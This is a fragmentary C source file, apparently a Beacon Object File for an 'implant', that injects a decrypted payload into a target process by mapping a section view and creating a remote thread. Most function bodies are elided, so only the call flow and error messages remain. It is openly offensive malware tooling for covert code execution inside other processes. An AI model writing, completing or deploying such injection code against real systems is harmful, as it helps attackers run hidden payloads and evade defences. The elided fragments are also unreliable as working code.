#include "procinj-sectionmaps-structs.h"
#include "procinj-sectionmaps-imports.h"
...
BOOL InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
	...
	if (hThread != NULL) {
		...
		PRINT("Cannot create user thread on the target process.\n");
		return FALSE;
	}
...
void go(char *args, int alen) {
	...
	if (pid) {
		...
		if (hProc != NULL) {
			...
			if(res == -1) {
				PRINT("[*] Failed to decrypt the payload...\n");
				return FALSE;
			}
			InjectVIEW(hProc, payload, payload_len);
			CloseHandle(hProc);
		} else {
			PRINT("[*] Failed to open the process. Does the implant have necessary privilege and/or integrity for this operation?\n");
			return;
		}
	}
	return;
